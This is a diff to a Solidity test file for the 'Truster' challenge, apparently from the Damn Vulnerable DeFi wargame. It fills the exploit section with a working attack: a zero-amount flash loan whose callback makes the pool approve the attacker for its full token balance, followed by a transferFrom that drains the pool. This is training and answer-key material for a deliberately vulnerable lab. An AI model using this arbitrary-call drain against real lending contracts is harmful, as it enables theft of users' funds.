@@ -41,7 +41,24 @@ contract Truster is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        uint256 poolBalance = dvt.balanceOf(address(trusterLenderPool));
+//        console.log("Pool balance is : ", poolBalance);
+        bytes memory data = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            address(attacker),
+            poolBalance
+        );
+        trusterLenderPool.flashLoan(
+            0,
+            address(attacker),
+            address(dvt),
+            data
+        );
+        dvt.transferFrom(address(trusterLenderPool), address(attacker), poolBalance);
+//        poolBalance = dvt.balanceOf(address(trusterLenderPool));
+//        console.log("Pool balance is : ", poolBalance);
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
